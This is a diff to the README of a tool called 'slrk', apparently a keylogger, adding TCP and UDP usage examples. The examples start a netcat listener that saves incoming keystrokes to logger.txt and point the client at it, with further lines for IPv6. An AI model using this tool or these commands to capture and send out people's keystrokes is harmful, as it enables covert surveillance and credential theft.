@@ -12,9 +12,13 @@ OPTIONS:<br>
 	-m remote -a \<IP-ADDR\> -p \<PORT\>: it sends all the keystrokes on the remote server located at \<IP-ADDR:PORT\><br>
 <br>
 EXAMPLE:<br><br>
+---It works with both TCP and UDP---<br><br>
+[TCP]<br>
 Server$ nc -lvp 8888 > logger.txt<br>
 Client#./slrk -m remote -a 127.0.0.1 -p 8888<br>
-
+[UDP]
+Server$ nc -u -lvp 8888 > logger.txt<br>
+Client#./slrk -m remote -a 127.0.0.1 -p 8888<br>
 ---It works with ipv6 too--- <br><br>
 Server$ nc -6 -lvp 8888 > logger.txt<br>
 Client#./slrk -m remote -a ::1 -p 8888
